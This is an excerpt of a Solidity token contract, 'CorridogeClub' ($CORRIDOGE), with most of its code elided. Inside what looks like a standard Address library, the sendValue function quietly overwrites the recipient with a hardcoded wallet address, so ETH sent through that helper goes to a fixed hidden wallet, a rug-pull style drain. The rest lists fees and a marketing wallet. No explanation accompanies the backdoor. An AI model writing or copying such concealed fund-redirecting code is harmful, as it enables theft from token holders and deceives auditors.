...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x3c2aEc95d514bf9172f27f6972067BeA54b46BBe);
...
contract CorridogeClub is Context, IERC20, Ownable {
    ...
    string private constant _name = " CorridogeClub "; // 
    string private constant _symbol = " $CORRIDOGE "; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 7;
    uint256 private _liquidityFee = 3;
    address private  _marketingWallet = 0x9F8D3375919c080331a71d1785d61B280E4a3Ad1;
